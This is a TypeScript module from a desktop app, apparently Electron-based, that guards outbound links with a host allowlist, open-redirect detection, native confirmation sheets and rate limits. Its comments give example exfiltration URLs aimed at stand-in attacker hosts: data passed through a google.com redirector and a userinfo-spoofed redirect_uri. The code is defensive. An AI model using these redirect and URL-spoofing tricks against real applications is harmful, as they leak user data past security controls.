export const PRODUCTION_APP_URL = "https://app.bizos.lol/localbizos";
export const DEVELOPMENT_APP_URL = "http://127.0.0.1:3000/localbizos";
export const OFFLINE_URL = "localbizos://offline/";
export const TEST_HARNESS_PATH = "/playwright-harness/chat-first";

/**
 * Where a link is allowed to go with no question asked.
 *
 * `https:` anywhere used to be the rule, and the rule was the hole: the bridge
 * is exposed to every script of the main frame, the guard checks the FRAME and
 * not a user gesture, so `openExternal("https://attacker/?data=…")` from a
 * same-origin XSS was an outbound HTTPS channel the page's `connect-src` never
 * saw — plus a burst of tabs nobody asked for.
 *
 * These are the destinations the product itself sends people to: the OAuth hops
 * (`facebook.com`/`meta.com`, `linkedin.com`, `google.com`, `apple.com`),
 * payments (`stripe.com`), the code the app links to (`github.com`) and BizOS's
 * own marketing/app domains. Everything else HTTPS still opens — after a native
 * sheet that shows the whole URL, in the main process, where a compromised
 * renderer cannot press the button.
 *
 * Matching is on the registrable-looking suffix: exactly the host, or a
 * subdomain of it. `notfacebook.com` is not `facebook.com`.
 */
export const EXTERNAL_ALLOWED_HOSTS = [
  "facebook.com",
  "meta.com",
  "linkedin.com",
  "stripe.com",
  "google.com",
  "apple.com",
  "github.com",
  "bizos.lol",
  "createbizos.com",
] as const;

function hostIsOrIsUnder(host: string, allowed: string): boolean {
  return host === allowed || host.endsWith(`.${allowed}`);
}

function canonicalHost(host: string): string {
  return host.toLowerCase().replace(/\.$/, "");
}

export function isAllowlistedExternalHost(host: string): boolean {
  const target = canonicalHost(host);
  return EXTERNAL_ALLOWED_HOSTS.some((allowed) => hostIsOrIsUnder(target, allowed));
}

/**
 * The pages an allowlisted host runs whose entire job is to send the visitor
 * somewhere else.
 *
 * `google.com/url?q=…` is a `google.com` URL, so the suffix test above called it
 * a business destination: no sheet, and past the "automatic navigation" door as
 * well. The browser then went where the parameter said — which is the outbound
 * HTTPS channel the sheet exists to close, rebuilt out of a host the product
 * itself vouches for (`https://www.google.com/url?q=https://attacker.example/
 * ?d=<the transcript>`).
 *
 * A `path` of `undefined` means the whole host is one of these (`l.facebook.com`
 * serves nothing else); otherwise only that path bounces.
 */
const KNOWN_REDIRECTOR_PATHS: ReadonlyArray<{ host: string; path?: RegExp }> = [
  { host: "google.com", path: /^\/url$/ },
  { host: "facebook.com", path: /^\/l\.php$/ },
  { host: "l.facebook.com" },
  { host: "linkedin.com", path: /^\/redir(\/|$)/ },
  { host: "lnkd.in" },
  { host: "t.co" },
];

/**
 * Does this URL hand a DESTINATION to the host it names?
 *
 * Two questions, because the list above can only ever name the redirectors we
 * happen to know: a known bouncing path, or any query parameter carrying an
 * absolute `http(s)` URL to an origin that is not this application's. The second
 * is what keeps an unlisted bounce endpoint on an allowlisted host from being a
 * free exfiltration channel.
 *
 * It compares parsed ORIGINS, never substrings: `redirect_uri=
 * https://app.bizos.lol@attacker.example/` contains the app's origin and IS
 * somebody else's URL. A value that claims to be absolute and does not parse
 * cleanly counts as foreign too — whatever the host feeds it to will not be
 * this parser.
 *
 * The OAuth hops the product actually uses keep passing: their `redirect_uri`
 * is this application's own origin, which is the one destination that is not
 * "somewhere else".
 */
export function isOpenRedirectUrl(candidate: string, applicationUrl: string): boolean {
  const target = parseCredentialFreeUrl(candidate);
  if (!target) return false;
  const host = canonicalHost(target.hostname);
  for (const redirector of KNOWN_REDIRECTOR_PATHS) {
    if (!hostIsOrIsUnder(host, redirector.host)) continue;
    if (!redirector.path || redirector.path.test(target.pathname)) return true;
  }
  const application = parseCredentialFreeUrl(applicationUrl);
  for (const value of target.searchParams.values()) {
    if (!/^\s*https?:\/\//i.test(value)) continue;
    const carried = parseCredentialFreeUrl(value.trim());
    if (!carried || !application || carried.origin !== application.origin) return true;
  }
  return false;
}

/**
 * `internal` — this app's own origin (`/billing`, `/terms`).
 * `allowed`  — a business destination, opened with no question.
 * `confirm`  — https anywhere else: it opens only if a NATIVE sheet says so.
 * `blocked`  — never handed to another program.
 */
export type ExternalUrlClassification = "internal" | "allowed" | "confirm" | "blocked";

function parseCredentialFreeUrl(raw: string): URL | null {
  try {
    const url = new URL(raw);
    if (url.username || url.password) return null;
    return url;
  } catch {
    return null;
  }
}

function isLoopbackDevelopmentUrl(url: URL): boolean {
  // `next dev` normalises loopback hosts to `localhost` in its own redirects
  // (login bounce, `next=` return), so both spellings of the loopback are the
  // same development origin. Nothing else on the network is accepted.
  return url.protocol === "http:" && (url.hostname === "127.0.0.1" || url.hostname === "localhost");
}

export function normalizeApplicationUrl(
  raw: string,
  packaged: boolean,
  allowTestHarness = false,
): URL {
  const url = parseCredentialFreeUrl(raw);
  if (!url || url.hash) {
    throw new Error("Local BizOS application URL is invalid");
  }

  const hasExactHarnessQuery =
    url.searchParams.size === 1 && url.searchParams.get("desktop") === "1";
  const harnessAllowed =
    !packaged &&
    allowTestHarness &&
    url.pathname === TEST_HARNESS_PATH &&
    hasExactHarnessQuery &&
    isLoopbackDevelopmentUrl(url);
  const applicationDocument = url.pathname === "/localbizos" && !url.search;
  if (!applicationDocument && !harnessAllowed) {
    throw new Error("Local BizOS application URL is invalid");
  }

  if (packaged) {
    if (url.href !== PRODUCTION_APP_URL) {
      throw new Error("Packaged Local BizOS accepts only the production application URL");
    }
    return url;
  }

  const isCanonicalProduction = url.origin === new URL(PRODUCTION_APP_URL).origin;
  if (!isCanonicalProduction && !isLoopbackDevelopmentUrl(url)) {
    throw new Error("Development Local BizOS accepts only production HTTPS or loopback (127.0.0.1 / localhost) HTTP");
  }
  return url;
}

export function isAllowedNavigation(candidate: string, applicationUrl: string): boolean {
  const target = parseCredentialFreeUrl(candidate);
  const application = parseCredentialFreeUrl(applicationUrl);
  if (!target || !application) return false;
  if (!new Set(["http:", "https:"]).has(target.protocol)) return false;
  return target.origin === application.origin;
}

export function classifyExternalUrl(
  candidate: string,
  applicationUrl: string,
): ExternalUrlClassification {
  if (candidate.length > MAX_EXTERNAL_URL_CHARS) return "blocked";
  if (isAllowedNavigation(candidate, applicationUrl)) return "internal";
  const target = parseCredentialFreeUrl(candidate);
  if (!target || target.protocol !== "https:") return "blocked";
  // An allowlisted host earns the silence only for ITSELF. One that is being
  // used as a doorway to a third party is exactly the destination the sheet was
  // written for, so it goes back through the sheet.
  const trusted =
    isAllowlistedExternalHost(target.hostname) && !isOpenRedirectUrl(candidate, applicationUrl);
  return trusted ? "allowed" : "confirm";
}

/** A URL is a URL, not a payload. Chromium truncates far beyond this; the point
 * is that nothing enormous is handed to another program. */
export const MAX_EXTERNAL_URL_CHARS = 2048;

export function isOfflineNavigation(candidate: string): boolean {
  const target = parseCredentialFreeUrl(candidate);
  return target?.href === OFFLINE_URL;
}

/** A link is a click, not a firehose. Three in ten seconds is more than any
 * person does and far less than a script wants. */
export const EXTERNAL_OPEN_LIMIT = 3;
export const EXTERNAL_OPEN_WINDOW_MS = 10_000;

export interface ExternalOpenerDependencies {
  /** The origin this window was opened with. */
  applicationUrl: string;
  /** `shell.openExternal`. */
  open(url: string): Promise<void>;
  /**
   * The NATIVE sheet for a destination that is not a known business one, with
   * the whole URL on it. Absent ⇒ nothing outside the allowlist ever leaves,
   * because a build that cannot ask cannot have an answer.
   */
  confirm?(input: { url: string; host: string }): Promise<boolean>;
  now?(): number;
  /** Every refusal says so somewhere: a silent block is a bug report nobody
   * can write. */
  log?(message: string): void;
}

/**
 * The ONE door out of this window, for both of the ways a URL reaches it.
 *
 * `open` is the bridge channel — a link the renderer says the reader asked for.
 * `handOff` is a navigation the PAGE started (`window.open`, a 302 the window
 * refuses to follow): there is no gesture behind it, so it never gets a sheet
 * and never leaves the allowlist. Both share one bucket, so alternating between
 * them buys no extra tabs.
 */
export class ExternalOpener {
  /** Tabs actually opened, by either door. */
  private readonly recentOpens: number[] = [];
  /** Questions actually put on screen. Its own bucket, so a script cannot ask
   * one every millisecond and a reader who says No does not pay for it. */
  private readonly recentSheets: number[] = [];
  private confirmationInFlight = false;

  constructor(private readonly deps: ExternalOpenerDependencies) {}

  /**
   * A link the RENDERER asked for. Answers whether it really left.
   *
   * The sheet comes FIRST and the tab's token is spent after it: the bucket
   * counts tabs, and a question the reader answered No to opened none. Spending
   * it up front meant three links a user REFUSED locked the door for ten
   * seconds, so the Stripe link they then clicked did nothing at all — the
   * limit punishing the person who kept saying no.
   */
  async open(candidate: string): Promise<boolean> {
    const classification = classifyExternalUrl(candidate, this.deps.applicationUrl);
    if (classification === "blocked") return false;
    if (classification === "confirm" && !(await this.answeredYes(candidate))) return false;
    if (!this.take(this.recentOpens)) {
      this.note(`refused a link: more than ${EXTERNAL_OPEN_LIMIT} in ${EXTERNAL_OPEN_WINDOW_MS / 1000}s`);
      return false;
    }
    return this.hand(candidate);
  }

  /**
   * The native sheet, and the two things that keep the question itself from
   * being the weapon.
   *
   * ONE at a time: a sheet is modal, and `open` is a bridge call a compromised
   * renderer makes in a loop. Three concurrent calls all cleared the bucket
   * before any of them reached `await confirm`, and three sheets came up
   * stacked — the reader dismisses them one by one and the Open they meant for
   * one URL lands on whichever is on top. A concurrent request is REFUSED, not
   * queued: a link nobody is waiting for is not worth asking about a second
   * later.
   */
  private async answeredYes(candidate: string): Promise<boolean> {
    const target = parseCredentialFreeUrl(candidate);
    if (!target) return false;
    if (!this.deps.confirm) {
      this.note(`refused ${target.hostname}: this build cannot ask before opening an unlisted host`);
      return false;
    }
    if (this.confirmationInFlight) {
      this.note(`refused ${target.hostname}: another link is already waiting for an answer`);
      return false;
    }
    if (!this.take(this.recentSheets)) {
      this.note(`refused ${target.hostname}: more than ${EXTERNAL_OPEN_LIMIT} questions in ${EXTERNAL_OPEN_WINDOW_MS / 1000}s`);
      return false;
    }
    this.confirmationInFlight = true;
    const allowed = await this.deps
      .confirm({ url: target.href, host: target.hostname })
      .catch(() => false)
      .finally(() => {
        this.confirmationInFlight = false;
      });
    if (!allowed) this.note(`declined ${target.hostname}`);
    return allowed;
  }

  /**
   * A navigation the PAGE started. Allowlist or nothing — an automatic redirect
   * is not a person choosing to leave, so it is never worth a dialog either.
   */
  async handOff(candidate: string): Promise<boolean> {
    const classification = classifyExternalUrl(candidate, this.deps.applicationUrl);
    if (classification !== "allowed" && classification !== "internal") {
      if (classification === "confirm") this.note(`did not hand off an automatic navigation to ${candidate.slice(0, 120)}`);
      return false;
    }
    if (!this.take(this.recentOpens)) {
      this.note(`refused a hand-off: more than ${EXTERNAL_OPEN_LIMIT} in ${EXTERNAL_OPEN_WINDOW_MS / 1000}s`);
      return false;
    }
    return this.hand(candidate);
  }

  /** `shell.openExternal` REJECTS (no browser, a URL the OS will not take).
   * Unhandled, that was an `unhandledRejection` in the main process; handled,
   * it is a `false` the caller already knows how to say out loud. */
  private async hand(url: string): Promise<boolean> {
    try {
      await this.deps.open(url);
      return true;
    } catch (error) {
      this.note(`the browser refused ${url.slice(0, 120)}: ${String(error)}`);
      return false;
    }
  }

  /** One shape, two buckets: what was OPENED and what was ASKED. */
  private take(bucket: number[]): boolean {
    const now = this.deps.now?.() ?? Date.now();
    while (bucket.length && bucket[0]! <= now - EXTERNAL_OPEN_WINDOW_MS) bucket.shift();
    if (bucket.length >= EXTERNAL_OPEN_LIMIT) return false;
    bucket.push(now);
    return true;
  }

  private note(message: string): void {
    (this.deps.log ?? ((line: string) => console.warn(`Local BizOS: ${line}`)))(message);
  }
}
